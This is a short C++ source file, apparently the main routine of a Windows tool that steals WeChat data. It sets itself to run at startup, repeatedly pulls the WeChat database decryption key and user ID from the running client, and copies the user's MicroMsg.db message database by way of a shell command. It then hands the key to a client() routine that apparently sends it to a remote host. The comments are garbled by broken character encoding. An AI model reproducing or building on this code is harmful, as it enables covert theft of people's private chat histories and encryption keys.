#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include "Getkey.h"
#include "Hack.h"

using namespace std;

unsigned char pass[33] = { 0 };
unsigned char filepath[256] = { 0 };
unsigned char wxid[256] = { 0 };

int main() {
	winStartUp();                      //��������

	while (1)                           //�Ƚϴ��ķ�����ÿ������һ�δ���
	{
		if (GetdbKey(pass,wxid) == 1)
			break;
		printf("hello\n");
		Sleep(5000);            //��ȡ��Կ
	}

	unsigned char value[256] = { 0 };
	unsigned char cmd_command[256] = { 0 };
	getPath(value);             //��ȡ���ݿ�λ��

	sprintf((char *)filepath, "%s\\WeChat Files\\%s\\Msg\\MicroMsg.db", value ,wxid);//���������ݿ������
	sprintf((char *)cmd_command, "copy \"%s\" MicroMsg.db /B", filepath); 
	printf("%s\n", cmd_command);
	system((const char *)cmd_command); //����һ�����ݿ⵽��ǰ�ļ���

	client(pass);             //�������ݿ����Կ
	return 0;
}